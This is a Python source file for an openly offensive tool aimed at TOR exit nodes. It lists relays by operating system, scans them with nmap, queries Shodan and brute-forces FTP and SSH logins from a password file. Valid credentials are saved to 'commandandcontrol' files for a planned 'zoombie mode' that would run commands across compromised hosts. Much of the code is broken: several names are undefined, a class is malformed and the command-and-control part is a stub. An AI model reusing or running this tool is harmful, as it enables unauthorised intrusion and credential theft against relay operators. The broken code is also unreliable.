from shodan.api import WebAPIError
import zlib
from shodan import WebAPI
from stem.descriptor import parse_file
from plumbum import cli, local
from stem.descriptor.remote import DescriptorDownloader
import logging as log
import threading
import nmap
import Queue
from time import gmtime, strftime
import paramiko 
import ftplib
import os
from stem import CircStatus
from stem.control import Controller
from stem.connection import MissingPassword, AuthenticationFailure
from getpass import getpass
from stem.util import term


#  ████████╗ ██████╗ ██████╗ ████████╗ █████╗ ███████╗ ██████╗ 
#  ╚══██╔══╝██╔═══██╗██╔══██╗╚══██╔══╝██╔══██╗╚══███╔╝██╔═══██╗
#     ██║   ██║   ██║██████╔╝   ██║   ███████║  ███╔╝ ██║   ██║
#     ██║   ██║   ██║██╔══██╗   ██║   ██╔══██║ ███╔╝  ██║   ██║
#     ██║   ╚██████╔╝██║  ██║   ██║   ██║  ██║███████╗╚██████╔╝
#     ╚═╝    ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝╚══════╝ ╚═════╝ 
#                                                              



#
#	Attack exit nodes of the TOR Network.
#	Author: Adastra.
#	http://thehackerway.com
#
#	TODO:
#
#	- Use combinators if the passfile is not issued, check itertools module.
#	- Check the Fabric library for Botnet C&C
#	- Testing and Doc.
#

class Cli(cli.Application):
	'''
		Command-Line options received.
	'''

	verbose = cli.Flag(["-v", '--verbose'], help="Verbose Mode.")
	brute = cli.Flag(["-b", '--brute'], help="Brute Force Mode. (Specify -f/--passwords-file option to select the passwords file. Every line should contain the the username and password to test separated with a colon <USER>:<PASSWORD>)")
	useMirror = cli.Flag(["-d", '--use-mirrors'], help="Use the mirror directories of TOR. This will help to not overwhelm the official directories")
	useShodan = cli.Flag(["-s", '--use-shodan'], help="Use ShodanHQ Service. (Specify -k/--shodan-key to set up the file where's stored your shodan key.)")
	useCircuitExitNodes = cli.Flag(["-c", "--use-circuit-nodes"], help="Use the exit nodes selected for a local instance of TOR.")	
	
	threads = 1 #Execution Threads.
	mode = None #Mode: Windows/Linux 
	dictFile = None #Dict. file for brute-force attacks.
	exitNodesToAttack = 10 #Number of default exit-nodes to filter from the Server Descriptor file.
	shodanKey = None #ShodanKey file.
	scanPorts = "21,22,23,53,69,80,88,110,139,143,161,389,443,445,1079,1080,1433,3306,5432,8080,9050,9051,5800" #Default ports used to scan with nmap.
	scanProtocol = 'tcp' #Using TCP protocol to perform the nmap scan.
	scanArguments = None #Scan Arguments passed to nmap.
	exitNodeFingerprint = None #Fingerprint of the exit-node to attack.
	queue = Queue.Queue() #Queue with the host/open-port found in the scanning. 
	controllerPort = '9151'
	zoombieMode = None
	
	@cli.switch(["-n", "--servers-to-attack"], int, help="Number of TOR exit-nodes to attack. Default = 10")
	def servers_to_attack(self, exitNodesToAttack):
		'''	
			Number of "exit-nodes" to attack received from command-line
		'''
		self.exitNodesToAttack = exitNodesToAttack

	@cli.switch(["-t", "--threads"], cli.Range(1, 20), help='Number of threads to use.')
	def number_threads(self, threads):
		'''	
			Number of threads to create when the scanning process has been done.
		'''
		self.threads = threads

	@cli.switch(["-m", "--mode"], cli.Set("windows", "linux", case_sensitive=False), mandatory=True, help="Filter the platform of exit-nodes to attack.")
	def server_mode(self, mode):
		'''
			Server Mode: Search for Windows or Linux machines.
		'''
		self.mode = mode

	@cli.switch(["-f", "--passwords-file"], help="Passwords File in the Bruteforce mode.", requires=["--brute"])
	def passwords_file(self, dictFile):
		'''
						User's file. Used to perform bruteforce attacks.		
		'''
		self.dictFile = dictFile

	@cli.switch(["-k", "--shodan-key"], str, help="Development Key to use Shodan API.", requires=["--use-shodan"])
	def shodan_key(self, shodanKey):
		'''
			This option is used to specify the file where the shodan development key is stored
		'''
		self.shodanKey = shodanKey

	@cli.switch(["-l", "--list-ports"], str, help="Comma-separated List of ports to scan with Nmap. Don't use spaces")
	def list_ports(self, scanPorts):
		'''
			List of ports used to perform the nmap scan.
		'''
		self.scanPorts = scanPorts

	@cli.switch(["-p", "--scan-protocol"], cli.Set("tcp", "udp", case_sensitive=True), help="Protocol used to scan the target.")
	def scan_protocol(self, scanProtocol):
		'''
			Protocol used to perform the nmap scan.
		'''
		self.scanProtocol = scanProtocol

	@cli.switch(["-a", "--scan-arguments"], str, help='Arguments to Nmap. Use "" to specify the arguments. For example: "-sSV -A -Pn"')
	def scan_arguments(self, scanArguments):
		'''
			Arguments used to perform the nmap scan.
		'''
		self.scanArguments = scanArguments

	@cli.switch(["-e", "--exit-node-fingerprint"], str, help="ExitNode's Fingerprint to attack.")
	def exitNode_Fingerprint(self, exitNodeFingerprint):
		'''
			If we want to perform a single attack against an known "exit-node", We can specify the fingerprint of the exit-node to perform the attack.
		'''
		self.exitNodeFingerprint = exitNodeFingerprint

	@cli.switch(["-i", "--controller-port"], str, help="Controller's port of the local instance of TOR. (Default=9151)", requires=["--use-circuit-nodes"])
	def controller_port(self, controllerPort):
		'''
			Controller's Port. Default=9151
		'''
		self.controllerPort = controllerPort
	
	@cli.switch(["-z", "--zoombie-mode"], str, help="This option reads the commandandcontrol* files generated from previous scans. Allows to send commands parallely over all the compromised hosts.")
	def zoombie_mode(self, zoombieMode):
		'''
		Zoombie mode to execute commands across the compromised hosts.
		'''
		self.zoombieMode = zoombieMode

	def main(self):
		'''
			List and Scan the exit nodes. The function will return an dictionary with the exitnodes found and the open ports.
			THIS PROCESS IS VERY SLOW AND SOMETIMES THE CONNECTION WITH THE DIRECTORY AUTHORITIES IS NOT AVAILABLE.
		'''
		if self.zoombieMode:
			control = CommandAndControl()
			control.execute(self.zoombieMode)
		else:
			discovery = Discovery(self)
			exitNodes = []
			if self.useCircuitExitNodes:
				exitNodes = discovery.listCircuitExitNodes()
			else:
				exitNodes = discovery.listAuthorityExitNodes() #Returns a tuple with IP Addresses and open-ports.
			
			if exitNodes != None and len(exitNodes) > 0:
				for thread in range(self.threads): #Creating the number of threads specified by command-line.
					worker = WorkerThread(self.queue, thread, self)
					worker.setDaemon(True)
					worker.start()

				for exitNode in exitNodes.items():
					self.queue.put(exitNode)
				self.queue.join() #Blocks the main process until the queue is empty.

		log.info("[+] Process finished at "+ strftime("%Y-%m-%d %H:%M:%S", gmtime()))

class Discovery:
	'''
		Class used to list the current "exit-nodes" from the TOR network and perform the nmap scanning to discover the open ports.
	'''
	exitNodes = {}
	cli = None
	scan = None

	def __init__(self, cli):
		self.cli = cli
		if self.cli.verbose:
			log.basicConfig(format="%(levelname)s: %(message)s", level=log.DEBUG)
			log.info(term.format("[+] Verbose mode activated.", term.Color.GREEN))
		else:
			log.basicConfig(format="%(levelname)s: %(message)s")
		log.info(term.format("[+] Process started at "+ strftime("%Y-%m-%d %H:%M:%S", gmtime()), term.Color.GREEN))

	def listAuthorityExitNodes(self):
		'''
			List the Exit Nodes using the filters specified by command-line.
		'''
		log.info(term.format("[+] Try to listing the current Exit-Nodes of TOR.", term.Color.GREEN))
		if self.cli.exitNodeFingerprint != None:
			log.info(term.format("[+] Using the fingerprint: %s " % (self.cli.exitNodeFingerprint), term.Color.GREEN))
		log.info(term.format("[+] Filter by platform: %s." % (self.cli.mode), term.Color.GREEN))
		log.info(term.format("[+] Retrieving the first %d records in the Descriptors." %(self.cli.exitNodesToAttack) , term.Color.GREEN))
		
		if self.cli.useMirror == True:
			log.info(term.format("[+] Using the Directory Mirrors to get the descriptors", term.Color.GREEN))
		downloader = DescriptorDownloader(use_mirrors=self.cli.useMirror)
		if self.cli.exitNodeFingerprint != None:
			descriptors = downloader.get_server_descriptors(fingerprints=[self.cli.exitNodeFingerprint])
		else:
			descriptors = downloader.get_server_descriptors()
		try:
			listDescriptors = descriptors.run()
		except zlib.error:
			log.error(term.format("[-] Error fetching the TOR descriptors. This is something quite common... Try again in a few seconds.", term.Color.RED))
			return
		return self.filterNodes(listDescriptors)

	def listCircuitExitNodes(self):
		listDescriptors = []
		log.info(term.format("[+] Trying to get a list of exit nodes from the already downloaded descriptors from the TOR Client instead of using the authority directories", term.Color.GREEN))
		if self.cli.controllerPort and self.cli.controllerPort.isdigit():
			try:
				controllerPass = getpass("Enter the password for the Local Controller (Empty if the instance doesn't need a password): ")
				controller = Controller.from_port(port = int(self.cli.controllerPort))
				if controllerPass:
					controller.authenticate(controllerPass)
				else:
					controller.authenticate()
				log.info(term.format("[+] TOR Controller Authentication Successful.", term.Color.GREEN))
				for circuit in controller.get_circuits():
					if circuit.status != CircStatus.BUILT:
						continue
					exit_fingerprint, exit_nickname = circuit.path[-1]
					'''
					As of Tor version 0.2.3.25 relays no longer get server descriptors by default. It's advised that you use microdescriptors instead, but if you really need server descriptors then you can get them by setting UseMicrodescriptors 0.				
					'''
					exitNode = controller.get_server_descriptor(exit_fingerprint, None)
					if exitNode:
						listDescriptors.append(exitNode)
					return self.filterNodes(listDescriptors)			
					#exit_address = exit_desc.address if exit_desc else 'unknown'
					#print "Exit relay"
					#print "  fingerprint: %s" % exit_fp
					#print "  nickname: %s" % exit_nickname
					#print "  address: %s" % exit_address
					#print
			except MissingPassword:
				log.warn(term.format("[-] Expected password in the AUTH process... This should not be empty", term.Color.RED))
			except AuthenticationFailure:
				log.warn(term.format("[-] The password specified is invalid.", term.Color.RED))
		else:
			log.warn(term.format("[-] The control port specified is invalid.", term.Color.RED))
	
	def filterNodes(self, listDescriptors):
		
		'''
			List the Exit Nodes using the filters specified by command-line.
		'''
		nodesAlreadyScanned = []
		nm = nmap.PortScanner()
		for descriptor in listDescriptors[0:self.cli.exitNodesToAttack]:
		#for descriptor in parse_file(open("/home/adastra/Escritorio/tor-browser_en-US-Firefox/Data/Tor/cached-consensus")):
			if self.cli.mode.lower() in descriptor.operating_system.lower() and descriptor.exit_policy.is_exiting_allowed():
				#SEARCH FILTERING BY FINGERPRINT
				#Conditions: Fingerprint specified in command-line AND
				#	 Relay Fingerprint equals to the Fingerprint specified in command-line. AND 
				#	 Relay's Operative System equals to the Operative System (option mode) specified in command-line AND
				#	 The Relay is a Exit Node. 	
				if descriptor.address not in nodesAlreadyScanned:
					log.info(term.format("[+] %s System has been found... Nickname: %s - OS Version: %s" % (descriptor.operating_system, descriptor.nickname, descriptor.operating_system), term.Color.YELLOW))
					log.info(term.format("[+] Starting the NMap Scan with the following options: ", term.Color.GREEN))
					log.info(term.format("[+][+] Scan Address: %s " % (descriptor.address), term.Color.GREEN))
					log.info(term.format("[+][+] Scan Arguments: %s " % (self.cli.scanArguments), term.Color.GREEN))
					log.info(term.format("[+][+] Scan Ports: %s " % (self.cli.scanPorts), term.Color.GREEN))
					if self.cli.scanArguments != None:
						nm.scan(descriptor.address, self.cli.scanPorts, arguments=self.cli.scanArguments)
					else:
						nm.scan(descriptor.address, self.cli.scanPorts)	
					self.recordNmapScan(nm)
					log.info(term.format('[+] Scan Ended for %s .' % (descriptor.nickname), term.Color.YELLOW))
					nodesAlreadyScanned.append(descriptor.address)
		if len(self.exitNodes) == 0:
			log.info(term.format("[+] In the first %d records searching for the %s Operating System, there's no results (machines with detected open ports)" %(self.cli.exitNodesToAttack, self.cli.mode.lower()), term.Color.RED))
		return self.exitNodes
	
	
	def recordNmapScan(self, scan):
		'''
			Performs the NMap scan using python-nmap library.
			Returns the exitnodes with the open ports found in the scanning process.
		'''
		entryFile = 'nmapScan.txt'
		nmapFileResults = open(entryFile, 'a')

		for host in scan.all_hosts():
			entry = '------- NMAP SCAN REPORT START FOR %s------- \n' %(host)
			entry += '[+] Host: %s \n' % (host)
			if scan[host].has_key('status'):
				entry += '[+][+]State: %s \n' % (scan[host]['status']['state'])
				entry += '[+][+]Reason: %s \n' % (scan[host]['status']['reason'])
			if scan[host].has_key(self.cli.scanProtocol):
				mapPorts = scan[host][self.cli.scanProtocol].keys()
				for port in mapPorts:
					entry += 'Port: %s \n' % (port)
					entry += 'State: %s \n ' % (scan[host][self.cli.scanProtocol][port]['state'])
					if 'open' in (scan[host][self.cli.scanProtocol][port]['state']):
						self.exitNodes[host] = port
					if scan[host][self.cli.scanProtocol][port].has_key('reason'):
						entry += 'Reason: %s \n ' % (scan[host][self.cli.scanProtocol][port]['reason'])
					if scan[host][self.cli.scanProtocol][port].has_key('name'):
						entry += 'Name: %s \n ' % (scan[host][self.cli.scanProtocol][port]['name'])
			else:
				log.info(term.format("[-] There's no match in the Nmap scan with the specified protocol %s" %(self.cli.scanProtocol), term.Color.RED))
			entry += '------- NMAP SCAN REPORT END ------- \n'
			entry += '\n\n'
			nmapFileResults.write(entry)
		nmapFileResults.close()

class WorkerThread(threading.Thread):
	'''
	Worker Thread to information gathering and attack the exit nodes found.
	'''
	
	def __init__(self, queue, tid, cli) :
		threading.Thread.__init__(self)
		self.queue = queue
		self.tid = tid
        	self.cli = cli
		#This maps to the function name and port number.	
		self.bruteForcePorts ={'ftpBrute':21, 'sshBrute':22}
		if self.cli.useShodan == True:
			#Using Shodan to search information about this machine in shodan database.
			log.info(term.format("[+] Shodan Activated. About to read the Development Key. ", term.Color.GREEN))
			if self.cli.shodanKey == None:
				#If the key is None, we can't use shodan.
				log.warn(term.format("[-] Shodan Key's File has not been specified. We can't use shodan without a valid key", term.Color.RED))
			else:
				#Read the shodan key and create the WebAPI object.
				shodanKey = open(self.cli.shodanKey).readline().rstrip('\n')
				self.shodanApi = WebAPI(shodanKey)
				log.info(term.format("[+] Connected to Shodan using Thread: %s " %(self.tid), term.Color.GREEN))
	def run(self) :
		lock = threading.Lock()
		while True :
			lock.acquire()
			host = None
			try:
				self.ip, self.port = self.queue.get(timeout=1)
				if hasattr(self, 'shodanApi'):
					log.info(term.format("[+] Using Shodan against %s " %(self.ip), term.Color.GREEN))
					try:
						shodanResults = self.shodanApi.host(self.ip)
						recordShodanResults(self, self.ip, shodanResults)
					except WebAPIError:
						log.error(term.format("[-] There's no information about %s in the Shodan Database." %(ip), term.Color.RED))
						pass
				
				if self.cli.brute == True:
					if self.cli.dictFile != None:
						for method in self.bruteForcePorts.keys():
							if self.bruteForcePorts[method] == self.port:
								#Open port detected for a service supported in the "Brute-Forcer"
								#Calling the method using reflection.
								attr(method)
								
					else:
						log.warn(term.format("[-] BruteForce mode specified but there's no files for users and passwords. Use -f option", term.Color.RED))
			except Queue.Empty :
				log.info(term.format("[+] Worker %d exiting... "%self.tid, term.Color.GREEN))
			finally:
				log.info(term.format("[+] Releasing the Lock in the Thread %d "%self.tid, term.Color.GREEN))
				lock.release()
				self.queue.task_done()
	
	def ftpBrute(self):
		log.info(term.format("[+] Starting FTP BruteForce mode on Thread: %d "%self.tid, term.Color.GREEN))
		log.info(term.format("[+] Reading the Passwords file %s " %(self.cli.passFile), term.Color.GREEN))
		ftpFileName = 'commandandcontrolftp.txt'
		if(os.path.exists(self.cli.passFile)):
			for line in open(self.cli.passFile, "r").readlines() :
				[user, passwd] = line.strip().split()
				try :
					ftpClient = ftplib.FTP(ipAddress)
					ftpClient.login(user, passwd)
				except:
					continue 
				if ftpClient:
					log.info(term.format("[+] Success ... username: %s and passoword %s is VALID! " % (username, passwd), term.Color.GREEN))
					ftpClient.quit()
					ftpFile = open(ftpFileName, 'a')
					entry =  '%s:%s:%s' %(self.ip, user, passwd)
					ftpFile.write(entry)
					ftpFile.close()			
		else:
			log.warn(term.format("[-] passwords file not found on the path %s" %(self.cli.passFile), term.Color.RED))
			
	def sshBrute(self):
		log.info(term.format("[+] Starting SSH BruteForce mode on Thread: %d " %self.tid, term.Color.GREEN))
		log.info(term.format("[+] Reading the Passwords file %s " %(self.cli.passFile), term.Color.GREEN))
		sshClient = paramiko.SSHClient()
		sshClient.set_missing_host_key_policy(paramiko.AutoAddPolicy())
		sshFileName = 'commandandcontrolssh.txt'
		if(os.path.exists(self.cli.passFile)):
			for line in open(self.cli.passFile, "r").readlines() :
				[user, passwd] = line.strip().split()
				try :
					ssh.connect(ipAddress, username=username, password=passwd)
				except paramiko.AuthenticationException:
					continue 
				log.info(term.format("[+] Success ... username: %s and passoword %s is VALID! " % (username, passwd), term.Color.GREEN))
				ssh.close()
				sshFile = open(sshFileName, 'a')
				entry =  '%s:%s:%s' %(self.ip, user, passwd)
				sshFile.write(entry)
				sshFile.close()			

				break
		else:
			log.warn(term.format("[-] passwords file not found on the path %s" %(self.cli.passFile), term.Color.RED))
			
			
	def recordShodanResults(self, host, results):
		entryFile = 'shodanScan-%s.txt' %(host)
		shodanFileResults = open(entryFile, 'a')
		entry = '------- SHODAN REPORT START FOR %s ------- \n' %(host)
		recursiveInfo(entry, results)		
		entry += '------- SHODAN REPORT END FOR %s ------- \n' %(host)
		shodanFileResults.write(entry)
		shodanFileResults.close()			

	def recursiveInfo(self, entry, data):
		if type(data) == dict:
			for key in results.keys():
				if type(key) == dict:
					entry += recursiveInfo(entry, key)
				elif type(key) == list:
					for element in key:
						if type(key) == dict:
							entry += recursiveInfo(entry, key)
											
				else:
					entry += '[+]%s : %s \n' %(key, results[key])
					print entry

class CommandAndControl():
'''
	CommandAndControl class used to execute commands over the compromised machines.
'''	

	def __init__(self, cli):
		self.cli = cli
	
	def executeCommand(self):
		self.cli

if __name__ == "__main__":
	'''
		Start the main program.
	'''
	Cli.run()
